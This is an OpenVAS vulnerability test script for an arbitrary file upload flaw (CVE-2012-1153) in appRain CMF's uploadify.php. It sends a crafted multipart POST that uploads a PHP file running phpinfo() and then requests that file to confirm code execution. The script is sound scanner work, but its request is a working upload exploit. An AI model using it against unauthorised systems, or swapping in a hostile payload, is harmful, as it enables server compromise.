###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apprain_51576.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# appRain CMF 'uploadify.php' Remote Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "appRain CMF is prone to an arbitrary-file-upload vulnerability because
the application fails to adequately sanitize user-supplied input.

An attacker may leverage this issue to upload arbitrary files to the
affected server; this can result in arbitrary code execution within
the context of the vulnerable application.

appRain CMF 0.1.5 and prior versions are vulnerable.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103395");
 script_cve_id("CVE-2012-1153");
 script_bugtraq_id(51576);
 script_version("$Revision: 9352 $");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_name("appRain CMF 'uploadify.php' Remote Arbitrary File Upload Vulnerability");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51576");
 script_xref(name : "URL" , value : "http://www.apprain.com");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2012-01-23 11:04:51 +0100 (Mon, 23 Jan 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "summary" , value : tag_summary);

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/apprain", "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/admin/system";
  buf = http_get_cache( item:url, port:port );

  if( "Start with appRain" >< buf ) {

    host = http_host_name( port:port );
    file = "openvas-" + rand() + ".php";
    ex ="<?php phpinfo();?>";
    len = 110 + strlen(ex);

    req = string("POST ",dir,"/webroot/addons/uploadify/uploadify.php HTTP/1.0\r\n",
		 "Host: ",host,"\r\n",
		 "Content-Length: ",len,"\r\n",
		 "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n",
		 "Connection: close\r\n",
		 "\r\n",
		 "--o0oOo0o\r\n",
		 'Content-Disposition: form-data; name="Filedata"; filename="',file,'"',"\r\n",
		 "\r\n",
		 ex,"\r\n",
		 "--o0oOo0o--\r\n\r\n");
    result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
    if( file >!< result ) continue;

    url = dir + "/addons/uploadify/uploads/" + file;
    if( http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)" ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
